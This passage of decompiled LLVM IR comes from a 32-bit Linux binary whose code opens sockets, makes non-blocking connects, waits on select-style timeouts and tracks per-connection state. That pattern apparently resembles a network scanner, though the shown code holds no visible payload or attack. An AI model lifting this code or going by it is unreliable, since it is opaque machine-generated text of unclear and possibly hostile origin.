  store i32 0, i32* %v2_804d2df, align 4
  %v0_804d2e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d2e1 = add i32 %v0_804d2e1, 4
  store i32 %v1_804d2e1, i32* %eax.global-to-local, align 4
  %v0_804d2e4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d2e4 = inttoptr i32 %v1_804d2e1 to i32*
  store i32 %v0_804d2e4, i32* %v2_804d2e4, align 4
  %v0_804d2e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d2e6 = add i32 %v0_804d2e6, 4
  store i32 %v1_804d2e6, i32* %eax.global-to-local, align 4
  %v0_804d2e9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d2e9 = inttoptr i32 %v1_804d2e6 to i32*
  store i32 %v0_804d2e9, i32* %v2_804d2e9, align 4
  %v0_804d2eb = load i32, i32* %eax.global-to-local, align 4
  %v1_804d2eb = add i32 %v0_804d2eb, 4
  store i32 %v1_804d2eb, i32* %eax.global-to-local, align 4
  %v0_804d2ee = load i32, i32* %edx.global-to-local, align 4
  %v2_804d2ee = inttoptr i32 %v1_804d2eb to i32*
  store i32 %v0_804d2ee, i32* %v2_804d2ee, align 4
  %v0_804d2f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d2f0 = add i32 %v0_804d2f0, 4
  store i32 %v1_804d2f0, i32* %eax.global-to-local, align 4
  %v0_804d2f3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d2f3 = inttoptr i32 %v1_804d2f0 to i32*
  store i32 %v0_804d2f3, i32* %v2_804d2f3, align 4
  %v0_804d2f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d2f5 = add i32 %v0_804d2f5, 4
  store i32 %v1_804d2f5, i32* %eax.global-to-local, align 4
  %v0_804d2f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d2f8 = inttoptr i32 %v1_804d2f5 to i32*
  store i32 %v0_804d2f8, i32* %v2_804d2f8, align 4
  %v0_804d2fa = load i32, i32* %eax.global-to-local, align 4
  %v1_804d2fa = add i32 %v0_804d2fa, 4
  %v0_804d2fd = load i32, i32* %edx.global-to-local, align 4
  %v2_804d2fd = inttoptr i32 %v1_804d2fa to i32*
  store i32 %v0_804d2fd, i32* %v2_804d2fd, align 4
  store i32 %v1_804d2b9, i32* %edx.global-to-local, align 4
  store i32 %v2_804d2bc, i32* @eax, align 4
  store i32 %v2_804d2bc, i32* %v1_804d2bc, align 4
  store i32 %storemerge39, i32* @ebx, align 4
  %v1_804d322 = call i32 @function_8049d73(i32 %v6_804d252)
  %v0_804d32c = load i32, i32* @ebx, align 4
  %v1_804d32e = mul i32 %v0_804d32c, 4
  store i32 %v1_804d32e, i32* %edx.global-to-local, align 4
  %v2_804d33c = mul i32 %v0_804d32c, 28
  %v1_804d340 = add i32 %v2_804d33e, %v2_804d33c
  store i32 %v1_804d340, i32* %eax.global-to-local, align 4
  %v2_804d343 = inttoptr i32 %v1_804d340 to i32*
  store i32 %v1_804d322, i32* %v2_804d343, align 4
  br label %dec_label_pc_804d45c

dec_label_pc_804d34a:                             ; preds = %dec_label_pc_804d27f
  %v5_804d360 = load i8, i8* %v4_804d295, align 1
  %v6_804d360 = zext i8 %v5_804d360 to i32
  %v9_804d360 = or i32 %v6_804d360, %v8_804d252
  store i32 %v9_804d360, i32* %eax.global-to-local, align 4
  %v4_804d364 = icmp eq i8 %v5_804d360, 0
  %v1_804d366 = icmp eq i1 %v4_804d364, false
  br i1 %v1_804d366, label %dec_label_pc_804d45c, label %dec_label_pc_804d36c

dec_label_pc_804d36c:                             ; preds = %dec_label_pc_804d34a
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d384 = add i32 %v2_804d384, %v2_804d201
  %v4_804d384 = inttoptr i32 %v3_804d384 to i8*
  %v5_804d384 = load i8, i8* %v4_804d384, align 1
  %v1_804d388 = add i8 %v5_804d384, 1
  store i8 %v1_804d388, i8* %v4_804d384, align 1
  store i32 %storemerge39, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d3be = add i32 %v2_804d3be, %v2_804d201
  %v4_804d3be = inttoptr i32 %v3_804d3be to i8*
  %v5_804d3be = load i8, i8* %v4_804d3be, align 2
  %v6_804d3be = zext i8 %v5_804d3be to i32
  %v9_804d3be = or i32 %v6_804d3be, %v8_804d252
  %v1_804d3c2 = add i32 %v9_804d3be, 1
  store i32 %v1_804d3c2, i32* @esi, align 4
  %v1_804d3dc = trunc i32 %v1_804d3c2 to i8
  store i8 %v1_804d3dc, i8* %v4_804d3be, align 2
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v5_804d3f6 = load i8, i8* %v4_804d384, align 1
  %v10_804d3fa = icmp eq i8 %v5_804d3f6, 14
  %v1_804d3fc = icmp eq i1 %v10_804d3fa, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804d3fc, label %dec_label_pc_804d41e, label %dec_label_pc_804d3fe

dec_label_pc_804d3fe:                             ; preds = %dec_label_pc_804d36c
  store i8 1, i8* %v4_804d295, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804d41e:                             ; preds = %dec_label_pc_804d36c
  %v5_804d434 = load i8, i8* %v4_804d3be, align 2
  %v6_804d434 = zext i8 %v5_804d434 to i32
  %v9_804d434 = or i32 %v6_804d434, %v8_804d252
  store i32 %v9_804d434, i32* %eax.global-to-local, align 4
  %v10_804d438 = icmp eq i8 %v5_804d434, 14
  %v1_804d43a = icmp eq i1 %v10_804d438, false
  br i1 %v1_804d43a, label %dec_label_pc_804d45c, label %dec_label_pc_804d43c

dec_label_pc_804d43c:                             ; preds = %dec_label_pc_804d41e
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804d295, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804d45c:                             ; preds = %dec_label_pc_804d41e, %dec_label_pc_804d34a, %dec_label_pc_804d2a1
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804d465 = load i32, i32* @esp, align 4
  %v1_804d468 = add i32 %v0_804d465, -16
  %v2_804d468 = inttoptr i32 %v1_804d468 to i32*
  store i32 23, i32* %v2_804d468, align 4
  %v0_804d46a = load i32, i32* %stack_var_-604, align 4
  %v1_804d46a = call i32 @function_80517c0(i32 %v0_804d46a)
  %v0_804d46f = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  %v1_804d4a7 = add i32 %v2_804d203, 4
  store i32 %v1_804d4a7, i32* %eax.global-to-local, align 4
  %v1_804d4aa = inttoptr i32 %v1_804d4a7 to i32*
  %v2_804d4aa = load i32, i32* %v1_804d4aa, align 4
  store i32 %v2_804d4aa, i32* %eax.global-to-local, align 4
  store i32 %storemerge39, i32* @ebx, align 4
  %v1_804d4b8 = add i32 %v0_804d46f, 8
  %v2_804d4b8 = inttoptr i32 %v1_804d4b8 to i32*
  store i32 0, i32* %v2_804d4b8, align 4
  %v1_804d4ba = add i32 %v0_804d46f, 4
  %v2_804d4ba = inttoptr i32 %v1_804d4ba to i32*
  store i32 1, i32* %v2_804d4ba, align 4
  %v2_804d4bc = inttoptr i32 %v0_804d46f to i32*
  store i32 2, i32* %v2_804d4bc, align 4
  %v2_804d4be = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v1_804d46a, 65536
  %v3_804d4be = sdiv i32 %sext, 65536
  %v4_804d4be = call i32 @function_8051dbc(i32 %v3_804d4be, i32 %v2_804d4aa, i32 %v2_804d4be)
  store i32 %v4_804d4be, i32* @esi, align 4
  %v0_804d4cb = load i32, i32* @ebx, align 4
  %v2_804d4db = mul i32 %v0_804d4cb, 28
  %v3_804d4dd = add i32 %v2_804d4db, %v2_804d124
  %v4_804d4dd = inttoptr i32 %v3_804d4dd to i32*
  store i32 %v4_804d4be, i32* %v4_804d4dd, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d4f6 = inttoptr i32 %v2_804d203 to i32*
  %v4_804d4f6 = load i32, i32* %v3_804d4f6, align 4
  store i32 %v4_804d4f6, i32* %eax.global-to-local, align 4
  %v10_804d4f9 = icmp eq i32 %v4_804d4f6, -1
  br i1 %v10_804d4f9, label %dec_label_pc_804e255, label %dec_label_pc_804d502

dec_label_pc_804d502:                             ; preds = %dec_label_pc_804d45c
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d518 = load i32, i32* %v3_804d4f6, align 4
  store i32 %v4_804d518, i32* %eax.global-to-local, align 4
  %v0_804d51b = load i32, i32* @esp, align 4
  %v1_804d51e = add i32 %v0_804d51b, -8
  %v2_804d51e = inttoptr i32 %v1_804d51e to i32*
  store i32 0, i32* %v2_804d51e, align 4
  %v1_804d520 = add i32 %v0_804d51b, -12
  %v2_804d520 = inttoptr i32 %v1_804d520 to i32*
  store i32 3, i32* %v2_804d520, align 4
  %v0_804d522 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d522 = add i32 %v0_804d51b, -16
  %v3_804d522 = inttoptr i32 %v2_804d522 to i32*
  store i32 %v0_804d522, i32* %v3_804d522, align 4
  %v1_804d523 = load i32, i32* %stack_var_-596, align 4
  %v3_804d523 = call i32 @function_8050014(i32 %v2_804d4aa, i32 %v1_804d523, i32 0)
  %v0_804d528 = load i32, i32* @esp, align 4
  %v12_804d52d = or i32 %v3_804d523, 2048
  store i32 %v12_804d52d, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d546 = load i32, i32* %v3_804d4f6, align 4
  store i32 %v4_804d546, i32* %eax.global-to-local, align 4
  %v2_804d54c = add i32 %v0_804d528, 8
  %v3_804d54c = inttoptr i32 %v2_804d54c to i32*
  store i32 %v12_804d52d, i32* %v3_804d54c, align 4
  %v1_804d54d = add i32 %v0_804d528, 4
  %v2_804d54d = inttoptr i32 %v1_804d54d to i32*
  store i32 4, i32* %v2_804d54d, align 4
  %v0_804d54f = load i32, i32* %eax.global-to-local, align 4
  %v3_804d54f = inttoptr i32 %v0_804d528 to i32*
  store i32 %v0_804d54f, i32* %v3_804d54f, align 4
  %v1_804d550 = load i32, i32* %stack_var_-596, align 4
  %v3_804d550 = call i32 @function_8050014(i32 %v2_804d4aa, i32 %v1_804d550, i32 0)
  %v0_804d555 = load i32, i32* @esp, align 4
  store i32 %v2_804d0b2, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d574 = load i32, i32* %v3_804d4f6, align 4
  store i32 %v4_804d574, i32* %eax.global-to-local, align 4
  %v1_804d57a = add i32 %v0_804d555, 8
  %v2_804d57a = inttoptr i32 %v1_804d57a to i32*
  store i32 16, i32* %v2_804d57a, align 4
  %v2_804d57c = add i32 %v0_804d555, 4
  %v3_804d57c = inttoptr i32 %v2_804d57c to i32*
  store i32 %v2_804d0b2, i32* %v3_804d57c, align 4
  %v0_804d57d = load i32, i32* %eax.global-to-local, align 4
  %v3_804d57d = inttoptr i32 %v0_804d555 to i32*
  store i32 %v0_804d57d, i32* %v3_804d57d, align 4
  %v1_804d57e = load i32, i32* %stack_var_-596, align 4
  %v3_804d57e = call i32 @function_8051c40(i32 %v2_804d4aa, i32 %v1_804d57e, i32 0)
  store i32 %v3_804d57e, i32* %eax.global-to-local, align 4
  %v10_804d586 = icmp eq i32 %v3_804d57e, -1
  %v1_804d589 = icmp eq i1 %v10_804d586, false
  br i1 %v1_804d589, label %dec_label_pc_804d5dc, label %dec_label_pc_804d58b

dec_label_pc_804d58b:                             ; preds = %dec_label_pc_804d502
  %v1_804d58b = call i32 @function_8050568(i32 %v2_804d4aa)
  store i32 %v1_804d58b, i32* %eax.global-to-local, align 4
  %v1_804d590 = inttoptr i32 %v1_804d58b to i32*
  %v2_804d590 = load i32, i32* %v1_804d590, align 4
  store i32 %v2_804d590, i32* %eax.global-to-local, align 4
  %v9_804d592 = icmp eq i32 %v2_804d590, 115
  br i1 %v9_804d592, label %dec_label_pc_804d5dc, label %dec_label_pc_804d597

dec_label_pc_804d597:                             ; preds = %dec_label_pc_804d58b
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d5ad = load i32, i32* %v3_804d4f6, align 4
  store i32 %v4_804d5ad, i32* %eax.global-to-local, align 4
  %v0_804d5b0 = load i32, i32* @esp, align 4
  %v2_804d5b3 = add i32 %v0_804d5b0, -16
  %v3_804d5b3 = inttoptr i32 %v2_804d5b3 to i32*
  store i32 %v4_804d5ad, i32* %v3_804d5b3, align 4
  %v1_804d5b4 = call i32 @function_804d02b(i32 %v2_804d4aa)
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804d295, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804d5dc:                             ; preds = %dec_label_pc_804d58b, %dec_label_pc_804d502
  store i8 1, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v1_804d205, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d208, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804d61d:                             ; preds = %dec_label_pc_804d23c
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804d627, i32* @edi, align 4
  %v5_804d62e = call i8* @_memset(i8* %tmp35, i32 0, i32 32)
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d64c = inttoptr i32 %v2_804d203 to i32*
  %v4_804d64c = load i32, i32* %v3_804d64c, align 4
  %v2_804d651 = udiv i32 %v4_804d64c, 32
  store i32 %v2_804d651, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d66a = load i32, i32* %v3_804d64c, align 4
  %v1_804d66d = urem i32 %v4_804d66a, 32
  store i32 %v1_804d66d, i32* %eax.global-to-local, align 4
  %v0_804d670 = load i32, i32* @ebp, align 4
  %v2_804d670 = mul nuw nsw i32 %v2_804d651, 4
  %v3_804d670 = add nsw i32 %v2_804d670, -316
  %v4_804d670 = add i32 %v3_804d670, %v0_804d670
  %v5_804d670 = inttoptr i32 %v4_804d670 to i32*
  %v6_804d670 = load i32, i32* %v5_804d670, align 4
  %v9_804d670 = shl i32 1, %v1_804d66d
  %v12_804d670 = or i32 %v6_804d670, %v9_804d670
  store i32 %v12_804d670, i32* %v5_804d670, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d6a2 = load i32, i32* %v3_804d64c, align 4
  %v1_804d6a5 = add i32 %v4_804d6a2, 1
  store i32 %v1_804d6a5, i32* %edx.global-to-local, align 4
  %v0_804d6a8 = load i32, i32* @esp, align 4
  %v2_804d6b1 = add i32 %v0_804d6a8, -16
  %v3_804d6b1 = inttoptr i32 %v2_804d6b1 to i32*
  store i32 %v2_804d6ab, i32* %v3_804d6b1, align 4
  %v1_804d6b2 = add i32 %v0_804d6a8, -20
  %v2_804d6b2 = inttoptr i32 %v1_804d6b2 to i32*
  store i32 0, i32* %v2_804d6b2, align 4
  store i32 %v2_804d627, i32* %eax.global-to-local, align 4
  %v2_804d6ba = add i32 %v0_804d6a8, -24
  %v3_804d6ba = inttoptr i32 %v2_804d6ba to i32*
  store i32 %v2_804d627, i32* %v3_804d6ba, align 4
  %v1_804d6bb = add i32 %v0_804d6a8, -28
  %v2_804d6bb = inttoptr i32 %v1_804d6bb to i32*
  store i32 0, i32* %v2_804d6bb, align 4
  %v0_804d6bd = load i32, i32* %edx.global-to-local, align 4
  %v2_804d6bd = add i32 %v0_804d6a8, -32
  %v3_804d6bd = inttoptr i32 %v2_804d6bd to i32*
  store i32 %v0_804d6bd, i32* %v3_804d6bd, align 4
  %v0_804d6be = load i32, i32* %stack_var_-328, align 4
  %v2_804d6be = load i32, i32* %stack_var_-320, align 4
  %v5_804d6be = call i32 @function_80503f0(i32 %v0_804d6be, i32 10000, i32 %v2_804d6be, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804d6be, i32* %eax.global-to-local, align 4
  %v0_804d6c3 = load i32, i32* @esp, align 4
  %v12_804d6c9 = icmp eq i32 %v5_804d6be, 1
  %v1_804d6cd = icmp eq i1 %v12_804d6c9, false
  br i1 %v1_804d6cd, label %dec_label_pc_804d873, label %dec_label_pc_804d6d3

dec_label_pc_804d6d3:                             ; preds = %dec_label_pc_804d61d
  store i32 4, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-192, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d6fd = load i32, i32* %v3_804d64c, align 4
  store i32 %v4_804d6fd, i32* %edx.global-to-local, align 4
  %v2_804d709 = add i32 %v0_804d6c3, 16
  %v3_804d709 = inttoptr i32 %v2_804d709 to i32*
  store i32 %v2_804d703, i32* %v3_804d709, align 4
  store i32 %v2_804d70a, i32* %eax.global-to-local, align 4
  %v2_804d710 = add i32 %v0_804d6c3, 12
  %v3_804d710 = inttoptr i32 %v2_804d710 to i32*
  store i32 %v2_804d70a, i32* %v3_804d710, align 4
  %v1_804d711 = add i32 %v0_804d6c3, 8
  %v2_804d711 = inttoptr i32 %v1_804d711 to i32*
  store i32 4, i32* %v2_804d711, align 4
  %v1_804d713 = add i32 %v0_804d6c3, 4
  %v2_804d713 = inttoptr i32 %v1_804d713 to i32*
  store i32 1, i32* %v2_804d713, align 4
  %v0_804d715 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d715 = inttoptr i32 %v0_804d6c3 to i32*
  store i32 %v0_804d715, i32* %v3_804d715, align 4
  %v0_804d716 = load i32, i32* %stack_var_-332, align 4
  %v1_804d716 = load i32, i32* %stack_var_-328, align 4
  %v3_804d716 = load i32, i32* %stack_var_-320, align 4
  %v5_804d716 = call i32 @function_8051c98(i32 %v0_804d716, i32 %v1_804d716, i32 10000, i32 %v3_804d716, i32 ptrtoint (i32* @0 to i32))
  %v0_804d71b = load i32, i32* @esp, align 4
  %v3_804d71e = load i32, i32* %stack_var_-192, align 4
  %v1_804d724 = icmp eq i32 %v3_804d71e, 0
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d79e = load i32, i32* %v3_804d64c, align 4
  store i32 %v4_804d79e, i32* %eax.global-to-local, align 4
  br i1 %v1_804d724, label %dec_label_pc_804d788, label %dec_label_pc_804d728

dec_label_pc_804d728:                             ; preds = %dec_label_pc_804d6d3
  %v2_804d744 = add i32 %v0_804d71b, 16
  %v3_804d744 = inttoptr i32 %v2_804d744 to i32*
  store i32 %v4_804d79e, i32* %v3_804d744, align 4
  %v0_804d745 = load i32, i32* %stack_var_-192, align 4
  %v1_804d745 = call i32 @function_804d02b(i32 %v0_804d745)
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d77e = add i32 %v2_804d1ad, %v2_804d201
  %v4_804d77e = inttoptr i32 %v3_804d77e to i8*
  store i8 1, i8* %v4_804d77e, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804d788:                             ; preds = %dec_label_pc_804d6d3
  %v1_804d7a4 = add i32 %v0_804d71b, 24
  %v2_804d7a4 = inttoptr i32 %v1_804d7a4 to i32*
  store i32 0, i32* %v2_804d7a4, align 4
  %v1_804d7a6 = add i32 %v0_804d71b, 20
  %v2_804d7a6 = inttoptr i32 %v1_804d7a6 to i32*
  store i32 3, i32* %v2_804d7a6, align 4
  %v0_804d7a8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d7a8 = add i32 %v0_804d71b, 16
  %v3_804d7a8 = inttoptr i32 %v2_804d7a8 to i32*
  store i32 %v0_804d7a8, i32* %v3_804d7a8, align 4
  %v0_804d7a9 = load i32, i32* %stack_var_-192, align 4
  %v3_804d7a9 = call i32 @function_8050014(i32 %v0_804d7a9, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d7ae = load i32, i32* @esp, align 4
  %v13_804d7b3 = and i32 %v3_804d7a9, -2049
  store i32 %v13_804d7b3, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d7cc = load i32, i32* %v3_804d64c, align 4
  store i32 %v4_804d7cc, i32* %eax.global-to-local, align 4
  %v2_804d7d2 = add i32 %v0_804d7ae, 8
  %v3_804d7d2 = inttoptr i32 %v2_804d7d2 to i32*
  store i32 %v13_804d7b3, i32* %v3_804d7d2, align 4
  %v1_804d7d3 = add i32 %v0_804d7ae, 4
  %v2_804d7d3 = inttoptr i32 %v1_804d7d3 to i32*
  store i32 4, i32* %v2_804d7d3, align 4
  %v0_804d7d5 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d7d5 = inttoptr i32 %v0_804d7ae to i32*
  store i32 %v0_804d7d5, i32* %v3_804d7d5, align 4
  %v0_804d7d6 = load i32, i32* %stack_var_-192, align 4
  %v3_804d7d6 = call i32 @function_8050014(i32 %v0_804d7d6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 0, i32* %v1_804d208, align 4
  %v1_804d81a = add i32 %v2_804d203, 20
  %v2_804d81a = inttoptr i32 %v1_804d81a to i16*
  store i16 0, i16* %v2_804d81a, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  %v1_804d838 = add i32 %v2_804d203, 24
  store i32 %v1_804d838, i32* %eax.global-to-local, align 4
  %v1_804d83b = inttoptr i32 %v1_804d838 to i32*
  %v2_804d83b = load i32, i32* %v1_804d83b, align 4
  store i32 %v2_804d83b, i32* %edx.global-to-local, align 4
  store i32 512, i32* %eax.global-to-local, align 4
  %v0_804d844 = load i32, i32* @esp, align 4
  %v2_804d847 = add i32 %v0_804d844, -8
  %v3_804d847 = inttoptr i32 %v2_804d847 to i32*
  store i32 512, i32* %v3_804d847, align 4
  %v1_804d848 = add i32 %v0_804d844, -12
  %v2_804d848 = inttoptr i32 %v1_804d848 to i32*
  store i32 0, i32* %v2_804d848, align 4
  %v0_804d84a = load i32, i32* %edx.global-to-local, align 4
  %v2_804d84a = add i32 %v0_804d844, -16
  %v3_804d84a = inttoptr i32 %v2_804d84a to i32*
  store i32 %v0_804d84a, i32* %v3_804d84a, align 4
  %v0_804d84b = load i32, i32* %stack_var_-192, align 4
  %v3_804d84b = inttoptr i32 %v0_804d84b to i8*
  %v4_804d84b = call i32 @function_805143c(i8* %v3_804d84b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804d252, align 4
  br label %dec_label_pc_804e255

dec_label_pc_804d873:                             ; preds = %dec_label_pc_804d61d
  %v13_804d873 = icmp eq i32 %v5_804d6be, -1
  %v1_804d877 = icmp eq i1 %v13_804d873, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804d877, label %dec_label_pc_804d8d9, label %dec_label_pc_804d879

dec_label_pc_804d879:                             ; preds = %dec_label_pc_804d873
  %v4_804d88f = load i32, i32* %v3_804d64c, align 4
  store i32 %v4_804d88f, i32* %eax.global-to-local, align 4
  %v2_804d895 = add i32 %v0_804d6c3, 16
  %v3_804d895 = inttoptr i32 %v2_804d895 to i32*
  store i32 %v4_804d88f, i32* %v3_804d895, align 4
  %v1_804d896 = call i32 @function_804d02b(i32 %v5_804d6be)
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d8cf = add i32 %v2_804d1ad, %v2_804d201
  %v4_804d8cf = inttoptr i32 %v3_804d8cf to i8*
  store i8 1, i8* %v4_804d8cf, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804d8d9:                             ; preds = %dec_label_pc_804d873
  store i32 %v1_804d205, i32* %eax.global-to-local, align 4
  %v2_804d8f4 = load i32, i32* %v1_804d208, align 4
  store i32 %v2_804d8f4, i32* %eax.global-to-local, align 4
  %v1_804d8f6 = add i32 %v2_804d8f4, 6
  store i32 %v1_804d8f6, i32* @ebx, align 4
  %v1_804d8fc = add i32 %v0_804d6c3, 16
  %v2_804d8fc = inttoptr i32 %v1_804d8fc to i32*
  store i32 0, i32* %v2_804d8fc, align 4
  %v1_804d8fe = inttoptr i32 %v5_804d6be to i32*
  %v2_804d8fe = call i32 @function_80504b0(i32* %v1_804d8fe)
  store i32 %v2_804d8fe, i32* %eax.global-to-local, align 4
  %v0_804d906 = load i32, i32* @ebx, align 4
  %v7_804d906 = icmp ult i32 %v0_804d906, %v2_804d8fe
  %v1_804d908 = icmp eq i1 %v7_804d906, false
  br i1 %v1_804d908, label %dec_label_pc_804e255, label %dec_label_pc_804d90e

dec_label_pc_804d90e:                             ; preds = %dec_label_pc_804d8d9
  %v0_804d903 = load i32, i32* @esp, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v4_804d924 = load i32, i32* %v3_804d64c, align 4
  store i32 %v4_804d924, i32* %eax.global-to-local, align 4
  %v3_804d92a = inttoptr i32 %v0_804d903 to i32*
  store i32 %v4_804d924, i32* %v3_804d92a, align 4
  %v0_804d92b = load i32, i32* %stack_var_-192, align 4
  %v1_804d92b = call i32 @function_804d02b(i32 %v0_804d92b)
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d964 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804d964 = inttoptr i32 %v3_804d964 to i8*
  store i8 1, i8* %v4_804d964, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804d96e:                             ; preds = %dec_label_pc_804d23c
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  %v1_804d986 = add i32 %v2_804d203, 24
  store i32 %v1_804d986, i32* %eax.global-to-local, align 4
  %v1_804d989 = inttoptr i32 %v1_804d986 to i32*
  %v2_804d989 = load i32, i32* %v1_804d989, align 4
  store i32 %v2_804d989, i32* @ebx, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d9a1 = inttoptr i32 %v2_804d203 to i32*
  %v4_804d9a1 = load i32, i32* %v3_804d9a1, align 4
  store i32 %v4_804d9a1, i32* %eax.global-to-local, align 4
  %v0_804d9a4 = load i32, i32* @esp, align 4
  %v1_804d9a7 = add i32 %v0_804d9a4, -16
  %v2_804d9a7 = inttoptr i32 %v1_804d9a7 to i32*
  store i32 134598804, i32* %v2_804d9a7, align 4
  %v1_804d9ac = add i32 %v0_804d9a4, -20
  %v2_804d9ac = inttoptr i32 %v1_804d9ac to i32*
  store i32 512, i32* %v2_804d9ac, align 4
  %v0_804d9b1 = load i32, i32* @ebx, align 4
  %v2_804d9b1 = add i32 %v0_804d9a4, -24
  %v3_804d9b1 = inttoptr i32 %v2_804d9b1 to i32*
  store i32 %v0_804d9b1, i32* %v3_804d9b1, align 4
  %v1_804d9b2 = add i32 %v0_804d9a4, -28
  %v2_804d9b2 = inttoptr i32 %v1_804d9b2 to i32*
  store i32 10000, i32* %v2_804d9b2, align 4
  %v0_804d9b7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d9b7 = add i32 %v0_804d9a4, -32
  %v3_804d9b7 = inttoptr i32 %v2_804d9b7 to i32*
  store i32 %v0_804d9b7, i32* %v3_804d9b7, align 4
  %v1_804d9b8 = call i32 @function_8048524(i32 %v6_804d252)
  %v0_804d9bd = load i32, i32* @esp, align 4
  %v1_804d9c0 = icmp eq i32 %v1_804d9b8, 0
  store i32 %v1_804d1f3, i32* @edx, align 4
  store i32 %v2_804d203, i32* %eax.global-to-local, align 4
  br i1 %v1_804d9c0, label %dec_label_pc_804da31, label %dec_label_pc_804d9c4

dec_label_pc_804d9c4:                             ; preds = %dec_label_pc_804d96e
  store i32 %v1_804d986, i32* %eax.global-to-local, align 4
  %v2_804d9df = load i32, i32* %v1_804d989, align 4
  store i32 %v2_804d9df, i32* %eax.global-to-local, align 4
  %v2_804d9e4 = add i32 %v0_804d9bd, 16
  %v3_804d9e4 = inttoptr i32 %v2_804d9e4 to i32*
  store i32 %v2_804d9df, i32* %v3_804d9e4, align 4
